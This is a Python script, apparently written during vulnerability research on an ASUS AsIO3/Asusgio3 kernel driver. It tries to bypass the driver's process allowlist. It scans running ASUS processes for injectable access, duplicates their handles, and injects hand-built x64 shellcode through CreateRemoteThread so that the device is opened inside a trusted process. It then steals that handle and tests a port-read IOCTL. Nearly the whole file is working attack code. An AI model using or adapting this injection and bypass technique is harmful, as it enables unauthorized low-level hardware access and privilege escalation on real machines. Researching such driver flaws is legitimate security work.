"""
Investigation: Why can't we open AsusCertService even as admin?
And what ASUS processes CAN we inject into?
"""
import ctypes
import ctypes.wintypes as wintypes
from ctypes import byref, windll, c_size_t
import struct
import os
import sys
import json
import subprocess

REPORT_DIR = r"C:\Users\researcher\OneDrive\Desktop\report\AsIO3"
sys.stdout = open(os.path.join(REPORT_DIR, "elevated_output2.txt"), "w")

ntdll = windll.ntdll
kernel32 = windll.kernel32
kernel32.OpenProcess.restype = wintypes.HANDLE
kernel32.CreateFileW.restype = wintypes.HANDLE
kernel32.GetCurrentProcess.restype = wintypes.HANDLE
kernel32.VirtualAllocEx.restype = ctypes.c_void_p
kernel32.GetProcAddress.restype = ctypes.c_void_p
kernel32.GetModuleHandleW.restype = wintypes.HANDLE
kernel32.CreateRemoteThread.restype = wintypes.HANDLE

PROCESS_ALL_ACCESS = 0x1F0FFF
PROCESS_DUP_HANDLE = 0x0040
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010
PROCESS_VM_WRITE = 0x0020
PROCESS_VM_OPERATION = 0x0008
PROCESS_CREATE_THREAD = 0x0002
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40
DUPLICATE_SAME_ACCESS = 0x00000002

is_admin = ctypes.windll.shell32.IsUserAnAdmin()
print(f"Admin: {is_admin}")
print(f"PID: {os.getpid()}")

findings = {"admin": bool(is_admin)}

# Get ALL ASUS processes
result = subprocess.run(['tasklist', '/FO', 'CSV'], capture_output=True, text=True)
asus_procs = []
for line in result.stdout.strip().split('\n')[1:]:
    parts = line.strip('"').split('","')
    if len(parts) >= 2:
        name = parts[0]
        pid = int(parts[1])
        name_lower = name.lower()
        if any(x in name_lower for x in ['asus', 'armoury', 'certservice', 'aura', 'aac', 'lightingservice']):
            asus_procs.append({"name": name, "pid": pid})

print(f"\nASUS processes found: {len(asus_procs)}")
for p in asus_procs:
    print(f"  {p['name']:45s} PID {p['pid']}")

# Test which ones we can open with what access rights
print("\n--- Access Rights Test ---")
injectable_pids = []
for p in asus_procs:
    pid = p['pid']
    name = p['name']

    # Try full access
    h = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if h:
        print(f"  {name:35s} PID {pid:6d}: FULL ACCESS")
        kernel32.CloseHandle(h)
        injectable_pids.append(p)
        continue

    # Try injection-necessary rights
    rights = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_DUP_HANDLE
    h = kernel32.OpenProcess(rights, False, pid)
    if h:
        print(f"  {name:35s} PID {pid:6d}: INJECT ACCESS")
        kernel32.CloseHandle(h)
        injectable_pids.append(p)
        continue

    # Try DuplicateHandle only
    h = kernel32.OpenProcess(PROCESS_DUP_HANDLE, False, pid)
    if h:
        print(f"  {name:35s} PID {pid:6d}: DUP_HANDLE only")
        kernel32.CloseHandle(h)
        continue

    # Try query only
    h = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
    err = kernel32.GetLastError() if not h else 0
    if h:
        print(f"  {name:35s} PID {pid:6d}: QUERY only")
        kernel32.CloseHandle(h)
    else:
        print(f"  {name:35s} PID {pid:6d}: DENIED (error {err})")

findings["injectable_processes"] = injectable_pids
print(f"\nInjectable processes: {len(injectable_pids)}")

# For injectable processes, check if ANY already have a device handle
# by enumerating handles
print("\n--- Handle Enumeration for Injectable Processes ---")
target_set = set(p['pid'] for p in injectable_pids)
# Also add all ASUS PIDs for handle scanning
target_set.update(p['pid'] for p in asus_procs)

buf_size = 0x4000000
buf = ctypes.create_string_buffer(buf_size)
ret_len = ctypes.c_ulong(0)
status = ntdll.NtQuerySystemInformation(64, buf, buf_size, byref(ret_len))

device_handles_found = []
if status >= 0:
    raw = buf.raw
    num_handles = struct.unpack_from('<Q', raw, 0)[0]
    print(f"Total system handles: {num_handles}")

    for i in range(min(num_handles, 1000000)):
        offset = 0x10 + i * 0x28
        if offset + 0x28 > len(raw):
            break
        pid = struct.unpack_from('<Q', raw, offset + 8)[0]
        if pid not in target_set:
            continue

        handle_val = struct.unpack_from('<Q', raw, offset + 0x10)[0]
        access = struct.unpack_from('<I', raw, offset + 0x18)[0]

        # Open process for handle dup
        h_proc = kernel32.OpenProcess(PROCESS_DUP_HANDLE, False, pid)
        if not h_proc:
            continue

        dup_h = wintypes.HANDLE(0)
        st = ntdll.NtDuplicateObject(h_proc, handle_val,
                                      kernel32.GetCurrentProcess(),
                                      byref(dup_h), 0, 0, DUPLICATE_SAME_ACCESS)
        if st < 0:
            kernel32.CloseHandle(h_proc)
            continue

        name_buf2 = ctypes.create_string_buffer(2048)
        ret2 = ctypes.c_ulong(0)
        st2 = ntdll.NtQueryObject(dup_h, 1, name_buf2, 2048, byref(ret2))
        obj_name = ""
        if st2 >= 0:
            nlen = struct.unpack_from('<H', name_buf2.raw, 0)[0]
            if 0 < nlen < 1024:
                try:
                    obj_name = name_buf2.raw[8:8+nlen].decode('utf-16-le')
                except:
                    pass
        kernel32.CloseHandle(dup_h)
        kernel32.CloseHandle(h_proc)

        if 'asusgio' in obj_name.lower() or 'asio3' in obj_name.lower():
            pname = next((p['name'] for p in asus_procs if p['pid'] == pid), str(pid))
            print(f"  FOUND: PID {pid} ({pname}) Handle 0x{handle_val:X} -> {obj_name}")
            device_handles_found.append({"pid": pid, "process": pname, "handle": handle_val, "access": access, "name": obj_name})

findings["device_handles"] = device_handles_found
if not device_handles_found:
    print("  No device handles found in any ASUS process")

# Now try injection into EACH injectable process
print("\n--- Injection Attempts ---")
injection_results = []

for p in injectable_pids:
    pid = p['pid']
    name = p['name']
    print(f"\n  Trying PID {pid} ({name})...")

    h_proc = kernel32.OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_DUP_HANDLE,
        False, pid)
    if not h_proc:
        print(f"    OpenProcess failed")
        continue

    # Allocate and write
    device_path = r"\\.\Asusgio3" + "\x00"
    path_bytes = device_path.encode('utf-16-le')

    mem = kernel32.VirtualAllocEx(h_proc, None, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
    if not mem:
        print(f"    VirtualAllocEx failed")
        kernel32.CloseHandle(h_proc)
        continue

    written = c_size_t(0)
    kernel32.WriteProcessMemory(h_proc, mem, path_bytes, len(path_bytes), byref(written))
    result_addr = mem + 0x200

    k32 = kernel32.GetModuleHandleW("kernel32.dll")
    cfw = kernel32.GetProcAddress(k32, b"CreateFileW")

    # Shellcode
    sc = bytearray()
    sc += b'\x48\x83\xEC\x58'
    sc += b'\x48\xB9' + struct.pack('<Q', mem)
    sc += b'\xBA' + struct.pack('<I', 0xC0000000)
    sc += b'\x41\xB8' + struct.pack('<I', 3)
    sc += b'\x4D\x31\xC9'
    sc += b'\xC7\x44\x24\x20' + struct.pack('<I', 3)
    sc += b'\xC7\x44\x24\x28' + struct.pack('<I', 0)
    sc += b'\x48\xC7\x44\x24\x30\x00\x00\x00\x00'
    sc += b'\x48\xB8' + struct.pack('<Q', cfw)
    sc += b'\xFF\xD0'
    sc += b'\x48\xA3' + struct.pack('<Q', result_addr)
    sc += b'\x48\x83\xC4\x58'
    sc += b'\xC3'

    sc_mem = kernel32.VirtualAllocEx(h_proc, None, len(sc), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not sc_mem:
        print(f"    Shellcode alloc failed")
        kernel32.CloseHandle(h_proc)
        continue

    kernel32.WriteProcessMemory(h_proc, sc_mem, bytes(sc), len(sc), byref(written))
    kernel32.WriteProcessMemory(h_proc, result_addr, b'\xFF'*8, 8, byref(written))

    tid = wintypes.DWORD(0)
    ht = kernel32.CreateRemoteThread(h_proc, None, 0, sc_mem, None, 0, byref(tid))
    if not ht:
        err = kernel32.GetLastError()
        print(f"    CreateRemoteThread failed: error {err}")
        kernel32.CloseHandle(h_proc)
        continue

    kernel32.WaitForSingleObject(ht, 10000)

    rbuf = (ctypes.c_byte * 8)()
    kernel32.ReadProcessMemory(h_proc, result_addr, rbuf, 8, byref(written))
    remote_handle = struct.unpack('<Q', bytes(rbuf))[0]
    print(f"    CreateFileW returned: 0x{remote_handle:X}")

    result_entry = {"pid": pid, "name": name, "remote_handle": remote_handle}

    if remote_handle != 0 and remote_handle != 0xFFFFFFFFFFFFFFFF:
        print(f"    SUCCESS! Device opened in {name}")
        result_entry["success"] = True

        # Duplicate to us
        our_h = wintypes.HANDLE(0)
        st = ntdll.NtDuplicateObject(h_proc, remote_handle,
                                      kernel32.GetCurrentProcess(),
                                      byref(our_h), 0, 0, DUPLICATE_SAME_ACCESS)
        if st >= 0:
            print(f"    Duplicated: 0x{our_h.value:X}")
            # Test IOCTL
            ibuf = (ctypes.c_byte * 8)()
            ibuf[0] = 0x80
            obuf = (ctypes.c_byte * 8)()
            br = wintypes.DWORD(0)
            r = kernel32.DeviceIoControl(our_h, 0xA0400F58, ibuf, 8, obuf, 8, byref(br), None)
            if r:
                print(f"    IOCTL WORKS! Port 0x80 = 0x{obuf[0]:02X}")
                result_entry["ioctl_success"] = True
                result_entry["port80"] = obuf[0]
            else:
                ie = kernel32.GetLastError()
                print(f"    IOCTL failed: error {ie}")
                result_entry["ioctl_error"] = ie
            kernel32.CloseHandle(our_h)
        else:
            print(f"    DuplicateObject failed")
    else:
        print(f"    FAILED - CreateFileW returned invalid handle")
        result_entry["success"] = False

    injection_results.append(result_entry)
    kernel32.CloseHandle(ht)
    kernel32.CloseHandle(h_proc)

    # Stop after first success
    if result_entry.get("success"):
        break

findings["injection_results"] = injection_results

# Summary
print("\n" + "=" * 60)
print("SUMMARY")
print("=" * 60)
success = any(r.get("success") for r in injection_results)
if success:
    winner = next(r for r in injection_results if r.get("success"))
    print(f"  BYPASS SUCCESSFUL via injection into {winner['name']} (PID {winner['pid']})")
    findings["bypass_successful"] = True
    findings["bypass_method"] = f"injection_into_{winner['name']}"
else:
    print(f"  No injection succeeded. All ASUS processes also get ACCESS_DENIED.")
    print(f"  This confirms: the driver's PID whitelist only contains the PID")
    print(f"  that was ENROLLED during process creation via the notify callback.")
    print(f"  But we proved the notify callback does NOTHING on creation!")
    print(f"  Therefore: enrollment happens in IRP_MJ_CREATE itself (function 0x3138).")
    print(f"  The enrollment checks path + file hash.")
    findings["bypass_successful"] = False

with open(os.path.join(REPORT_DIR, "bypass_analysis.json"), 'w') as f:
    json.dump(findings, f, indent=2, default=str)
print(f"\nSaved to bypass_analysis.json")
sys.stdout.close()
